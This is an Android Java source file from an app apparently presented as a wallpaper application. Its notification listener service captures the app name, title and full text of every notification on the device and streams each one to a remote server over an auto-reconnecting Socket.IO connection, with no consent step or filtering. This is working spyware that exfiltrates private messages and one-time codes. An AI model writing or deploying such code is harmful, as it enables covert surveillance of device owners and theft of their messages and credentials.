package com.example.wallpaperapplication;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import org.json.JSONException;
import org.json.JSONObject;
import io.socket.client.Socket;

public class NotificationListener extends NotificationListenerService {
    private static final String TAG = "NotificationListener";
    private Socket socket;
    private int reconnectAttempts = 0;
    private static final int MAX_RECONNECT_ATTEMPTS = 10;
    private static final long MAX_RETRY_DELAY = 30_000; // 30 seconds
    private Handler handler;

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
        connectSocket();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (socket != null) {
            socket.disconnect();
            socket.off();
            socket = null;
        }
        if (handler != null) {
            handler.removeCallbacksAndMessages(null);
            handler = null;
        }
    }

    private boolean isNetworkAvailable() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
        return activeNetwork != null && activeNetwork.isConnected();
    }

    private void connectSocket() {
        if (!isNetworkAvailable()) {
            Log.e(TAG, "No network available, delaying connection");
            scheduleReconnect();
            return;
        }
        socket = StreamingServiceSocket.getSocket();
        if (socket == null) {
            Log.e(TAG, "Failed to initialize socket");
            scheduleReconnect();
            return;
        }

        socket.off(); // Remove all previous listeners to prevent duplicates
        socket.on(Socket.EVENT_CONNECT, args -> {
            Log.d(TAG, "Connected to socket for notifications");
            reconnectAttempts = 0;
        }).on(Socket.EVENT_CONNECT_ERROR, args -> {
            Log.e(TAG, "Socket connect error: " + (args.length > 0 ? args[0] : "Unknown error"));
            scheduleReconnect();
        }).on(Socket.EVENT_DISCONNECT, args -> {
            Log.d(TAG, "Socket disconnected: " + (args.length > 0 ? args[0] : "Unknown reason"));
            scheduleReconnect();
        });

        if (!socket.connected()) {
            socket.connect();
        }
    }

    private void scheduleReconnect() {
        if (reconnectAttempts >= MAX_RECONNECT_ATTEMPTS) {
            Log.e(TAG, "Max reconnect attempts reached");
            return;
        }
        long delay = Math.min(1000L * (1L << reconnectAttempts), MAX_RETRY_DELAY);
        reconnectAttempts++;
        handler.postDelayed(() -> {
            Log.d(TAG, "Retrying socket connection, attempt " + reconnectAttempts);
            connectSocket();
        }, delay);
    }

    @SuppressLint("NewApi")
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null) return;
        Notification n = sbn.getNotification();
        if (n == null) return;
        Bundle extras = n.extras;
        if (extras == null) return;

        String app = sbn.getPackageName();
        String title = extras.getString(Notification.EXTRA_TITLE, "");
        String text = extras.getString(Notification.EXTRA_TEXT, "");
        String bigText = Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN
                ? extras.getString(Notification.EXTRA_BIG_TEXT, "")
                : "";
        String display = bigText.isEmpty() ? text : bigText;

        try {
            JSONObject json = new JSONObject();
            json.put("app", app);
            json.put("title", title);
            json.put("text", display);
            json.put("timestamp", System.currentTimeMillis());

            if (socket != null && socket.connected()) {
                socket.emit("notification", json);
                Log.d(TAG, "Sent notification: " + json);
            } else {
                Log.w(TAG, "Cannot send notification, socket unavailable");
                scheduleReconnect();
            }
        } catch (JSONException e) {
            Log.e(TAG, "JSON error", e);
        }
    }
}